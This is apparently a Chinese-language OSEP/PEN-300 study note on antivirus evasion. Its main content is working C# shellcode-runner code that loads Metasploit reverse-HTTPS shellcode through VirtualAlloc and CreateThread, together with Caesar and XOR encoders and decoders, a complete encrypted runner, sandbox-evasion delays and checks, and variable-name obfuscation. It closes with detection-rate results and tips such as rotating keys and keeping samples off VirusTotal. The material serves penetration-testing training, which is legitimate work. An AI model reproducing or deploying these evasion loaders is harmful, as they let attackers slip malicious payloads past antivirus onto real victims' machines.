---
title: OSEP-07-自定义CSharp绕过杀软
description: '07-杀软绕过 | 03-自定义CSharp绕过杀软'
pubDate: 2026-01-30T00:01:02+08:00
image: /image/fengmian/OSEP.png
categories:
  - Documentation
  - OffSec
tags:
  - PEN-300-OSEP
  - Windows Learning
  - Exploit Development
---

# 自定义 C# Shellcode Runner 绕过杀软

## 为什么自定义代码有效？

1. **无公开签名** - 杀软没有你代码的签名
2. **灵活性高** - 可以随时修改
3. **自定义加密** - 解密例程也是自定义的

## 基础 Shellcode Runner

```csharp
using System;
using System.Runtime.InteropServices;

namespace ShellcodeRunner
{
    class Program
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
            uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes,
            uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter,
            uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle,
            UInt32 dwMilliseconds);

        static void Main(string[] args)
        {
            // msfvenom -p windows/x64/meterpreter/reverse_https -f csharp
            // 将授权实验中生成的完整 byte[] 粘贴到这里；不要把省略号放进数组。
            byte[] buf = new byte[] {
                0xfc, 0x48, 0x83, 0xe4
            };

            int size = buf.Length;

            IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)buf.Length, 0x3000, 0x40);

            Marshal.Copy(buf, 0, addr, size);

            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr,
                IntPtr.Zero, 0, IntPtr.Zero);

            WaitForSingleObject(hThread, 0xFFFFFFFF);
        }
    }
}
```

## Caesar 密码加密

### 加密原理

将每个字节值加上一个固定数值（密钥）

### 加密器代码

```csharp
using System;
using System.Text;

namespace Helper
{
    class Program
    {
        static void Main(string[] args)
        {
            // 原始 shellcode：粘贴完整 byte[]，不要把省略号放进数组。
            byte[] buf = new byte[] {
                0xfc, 0x48, 0x83, 0xe4, 0xf0
            };

            // 加密（密钥 = 2）
            byte[] encoded = new byte[buf.Length];
            for(int i = 0; i < buf.Length; i++)
            {
                encoded[i] = (byte)(((uint)buf[i] + 2) & 0xFF);
            }

            // 输出格式化的 shellcode
            StringBuilder hex = new StringBuilder(encoded.Length * 2);
            foreach(byte b in encoded)
            {
                hex.AppendFormat("0x{0:x2}, ", b);
            }

            Console.WriteLine("The payload is: " + hex.ToString());
        }
    }
}
```

### 解密器代码

```csharp
// 加密后的 shellcode
byte[] buf = new byte[] {
    0xfe, 0x4a, 0x85, 0xe6, 0xf2
};

// 解密（密钥 = 2）
for(int i = 0; i < buf.Length; i++)
{
    buf[i] = (byte)(((uint)buf[i] - 2) & 0xFF);
}
```

## XOR 加密

### 加密器

```csharp
byte[] buf = new byte[] { 0xfc, 0x48, 0x83 };  // 实际使用时替换为完整 shellcode
byte[] encoded = new byte[buf.Length];
byte key = 0xfa;  // XOR 密钥

for(int i = 0; i < buf.Length; i++)
{
    encoded[i] = (byte)(buf[i] ^ key);
}
```

### 解密器

```csharp
byte[] buf = new byte[] { 0x06, 0xb2, 0x79 };  // 加密后的 shellcode，实际使用时替换为完整字节
byte key = 0xfa;

for(int i = 0; i < buf.Length; i++)
{
    buf[i] = (byte)(buf[i] ^ key);
}
```

## 完整加密 Shellcode Runner

```csharp
using System;
using System.Runtime.InteropServices;

namespace EncryptedRunner
{
    class Program
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
            uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes,
            uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter,
            uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle,
            UInt32 dwMilliseconds);

        static void Main(string[] args)
        {
            // Caesar 加密后的 shellcode（密钥 = 2）
            // 将加密后的完整 byte[] 粘贴到这里；不要把省略号放进数组。
            byte[] buf = new byte[] {
                0xfe, 0x4a, 0x85, 0xe6, 0xf2
            };

            // 解密
            for(int i = 0; i < buf.Length; i++)
            {
                buf[i] = (byte)(((uint)buf[i] - 2) & 0xFF);
            }

            int size = buf.Length;

            IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)buf.Length, 0x3000, 0x40);

            Marshal.Copy(buf, 0, addr, size);

            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr,
                IntPtr.Zero, 0, IntPtr.Zero);

            WaitForSingleObject(hThread, 0xFFFFFFFF);
        }
    }
}
```

## 检测率对比

| 版本 | AntiScan.Me 检测率 |
|------|-------------------|
| 未加密 | 11/26 |
| Caesar 加密 | 7/26 |

## 进一步优化

### 1. 使用更复杂的加密

```csharp
// 多轮 XOR
for(int round = 0; round < 3; round++)
{
    for(int i = 0; i < buf.Length; i++)
    {
        buf[i] = (byte)(buf[i] ^ keys[round]);
    }
}
```

### 2. 添加延迟

```csharp
// 延迟执行，绕过沙箱
Thread.Sleep(10000);  // 10 秒
```

### 3. 环境检测

```csharp
// 检测是否在沙箱中
if (Environment.MachineName.Contains("SANDBOX"))
{
    return;
}
```

### 4. 混淆变量名

```csharp
// 使用无意义的变量名
byte[] a1b2c3 = new byte[] { 0xfc, 0x48, 0x83 };  // 实际使用时替换为完整 shellcode
IntPtr x9y8z7 = VirtualAlloc(IntPtr.Zero, (uint)a1b2c3.Length, 0x3000, 0x40);
```

## 最佳实践

1. **定期更换密钥** - 避免签名
2. **组合多种技术** - 加密 + 混淆 + 延迟
3. **测试多个杀软** - 不同杀软检测不同
4. **避免上传 VirusTotal** - 会暴露样本
